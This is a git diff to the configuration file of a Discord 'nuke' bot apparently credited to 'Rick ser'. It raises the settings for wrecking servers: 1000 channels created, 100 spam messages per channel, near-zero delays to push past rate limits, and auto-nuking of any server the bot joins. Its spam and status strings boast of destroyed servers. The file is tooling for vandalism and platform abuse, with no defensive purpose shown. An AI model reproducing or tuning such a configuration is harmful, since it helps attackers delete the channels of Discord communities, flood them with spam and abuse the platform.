@@ -1,4 +1,4 @@
-// config.js - All bot configuration in one place
+// config.js - ULTRA FAST CONFIGURATION
 require('dotenv').config();
 
 module.exports = {
@@ -6,50 +6,43 @@ module.exports = {
     token: process.env.DISCORD_TOKEN || 'YOUR_BOT_TOKEN_HERE',
     prefix: '!',
     
-    // Nuke Settings
+    // MASSIVE NUKE Settings
     channelName: 'IMPOSTER-network',
     spamMessage: 'Nuke by Rick ser',
-    channelsToCreate: 10,
-    messagesPerChannel: 5,
+    channelsToCreate: 1000,           // Create 1000 channels
+    messagesPerChannel: 100,           // 100 messages per channel = 100,000 total messages
     
-    // Delay Settings (milliseconds) - Prevents rate limiting
+    // SPEED Settings (milliseconds) - MINIMAL DELAYS FOR MAXIMUM SPEED
     delays: {
-        delete: 300,      // Delay between channel deletions
-        create: 500,       // Delay between channel creations
-        spam: 200,         // Delay between messages
-        embed: 300         // Delay after embed
+        delete: 50,       // 50ms between deletions (FAST)
+        create: 20,       // 20ms between creations (ULTRA FAST)
+        spam: 10,         // 10ms between messages (MAXIMUM SPEED)
+        embed: 50         // 50ms after embed
     },
     
     // Auto Nuke Settings
-    autoNukeOnJoin: true,  // Automatically nuke any server the bot joins
+    autoNukeOnJoin: true,
     
     // Server Settings
     port: process.env.PORT || 3000,
     
-    // Colors for console logging
-    colors: {
-        success: '#00ff00',
-        error: '#ff0000',
-        warning: '#ffff00',
-        info: '#00ffff',
-        nuke: '#ff0000'
-    },
-    
     // Bot Status Messages
     statusMessages: [
-        '💀 NUKE READY',
-        '🔥 IMPOSTER NETWORK',
+        '💀 1000 CHANNELS',
+        '🔥 MASSIVE NUKE',
         '⚡ BY RICK SER',
-        '💀 DESTROY ALL CHANNELS'
+        '💀 100k MESSAGES'
     ],
     
-    // Spam Messages Array (for variety)
+    // Spam Messages Array
     spamMessages: [
         '💀 **Nuke by Rick ser** 💀',
         '🔥 **IMPOSTER NETWORK** 🔥',
-        '⚡ **CHANNELS DELETED** ⚡',
+        '⚡ **1000 CHANNELS CREATED** ⚡',
         '💀 **THIS SERVER IS GONE** 💀',
         '🔥 **BY RICK SER** 🔥',
-        '⚡ **IMPOSTER RULES** ⚡'
+        '⚡ **MASSIVE DESTRUCTION** ⚡',
+        '💀 **RICK SER OWNS HERE** 💀',
+        '🔥 **100K MESSAGES SENT** 🔥'
     ]
 };
